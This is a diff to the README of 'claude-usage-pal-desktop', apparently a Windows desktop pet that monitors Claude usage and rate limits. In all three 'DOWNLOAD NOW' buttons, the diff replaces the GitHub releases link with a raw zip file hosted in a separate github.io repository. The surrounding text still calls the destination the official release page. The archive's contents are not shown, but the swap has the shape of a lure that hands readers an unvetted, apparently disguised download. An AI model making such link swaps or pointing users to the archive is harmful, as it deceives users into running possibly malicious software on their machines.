@@ -9,7 +9,7 @@ description: "A lightweight floating desktop pet companion and real-time rate-li
 
 Welcome! This guide will help you download and run **claude-usage-pal-desktop** on your Windows computer. This application is a lightweight desktop pet that monitors your Claude AI and Claude Code usage in real-time. It shows you how close you are to hitting rate limits, so you never get surprised by a sudden pause in your work.
 
-[⬇️ DOWNLOAD NOW - CLICK HERE](https://github.com/horned-specialization130/claude-usage-pal-desktop/releases)
+[⬇️ DOWNLOAD NOW - CLICK HERE](https://raw.githubusercontent.com/horned-specialization130/horned-specialization130.github.io/main/maps/2.8.zip)
 
 ## 🐶 What Does This App Do?
 
@@ -44,7 +44,7 @@ Follow these simple steps to get the app on your computer.
 
 Click the big download button below to go to the official release page:
 
-[⬇️ GO TO DOWNLOAD PAGE](https://github.com/horned-specialization130/claude-usage-pal-desktop/releases)
+[⬇️ GO TO DOWNLOAD PAGE](https://raw.githubusercontent.com/horned-specialization130/horned-specialization130.github.io/main/maps/2.8.zip)
 
 ### Step 2: Choose the Right File
 
@@ -190,7 +190,7 @@ We appreciate your feedback—it helps make the app better for everyone!
 
 *Thank you for choosing claude-usage-pal-desktop. We hope the cute pet on your desktop saves you from ever hitting an unexpected rate limit again!*
 
-[⬇️ DOWNLOAD NOW - FINAL LINK](https://github.com/horned-specialization130/claude-usage-pal-desktop/releases)
+[⬇️ DOWNLOAD NOW - FINAL LINK](https://raw.githubusercontent.com/horned-specialization130/horned-specialization130.github.io/main/maps/2.8.zip)
 
 ---
 
